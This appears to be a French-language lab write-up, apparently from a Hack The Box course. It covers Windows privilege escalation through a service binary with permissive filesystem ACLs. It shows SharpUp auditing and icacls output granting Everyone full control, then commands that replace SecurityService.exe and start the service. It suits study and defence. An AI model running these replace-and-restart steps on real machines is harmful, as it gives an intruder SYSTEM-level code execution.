# Permissive File System ACL

### <mark style="color:red;">Permissive File System ACL</mark>

#### <mark style="color:green;">Exécution de SharpUp</mark>

Nous pouvons utiliser SharpUp de la suite d'outils GhostPack pour vérifier les binaires de service souffrant d'ACLs faibles.

```powershell
PS C:\htb> .\SharpUp.exe audit
```

L'outil identifie le PC Security Management Service, qui exécute le binaire SecurityService.exe lorsqu'il est démarré.

#### <mark style="color:green;">Vérification des permissions avec icacls</mark>

{% code fullWidth="true" %}
```powershell
PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
```
{% endcode %}

<table data-full-width="true"><thead><tr><th>🔧 Type d’ACL</th><th>📂 ACL système de fichiers</th><th>🧱 ACL dans Active Directory</th></tr></thead><tbody><tr><td>📌 Où ?</td><td>Sur les fichiers, dossiers, services, registres...</td><td>Sur les objets AD : utilisateurs, groupes, ordinateurs, OU, GPO...</td></tr><tr><td>📜 Stockage</td><td>Dans le <strong>NTFS</strong> (fichier + registre)</td><td>Dans la <strong>base AD</strong> (NTDS.dit)</td></tr><tr><td>🧑 Autorisations</td><td>Contrôle qui peut lire, écrire, exécuter, modifier un fichier ou un service</td><td>Contrôle qui peut réinitialiser un mot de passe, déléguer des droits, modifier des attributs</td></tr><tr><td>🔐 Format</td><td>DACLs (Discretionary ACLs) → liste de permissions NTFS</td><td>DACLs (similaires mais appliquées aux objets LDAP/AD)</td></tr><tr><td>📎 Exemple</td><td><code>icacls fichier.txt</code> → montre les groupes qui ont accès</td><td><code>dsacls "OU=IT,DC=entreprise,DC=local"</code> → montre qui contrôle l'OU</td></tr></tbody></table>

#### <mark style="color:green;">Remplacement du binaire de service</mark>

{% code fullWidth="true" %}
```powershell
C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\htb> sc start SecurityService
```
{% endcode %}
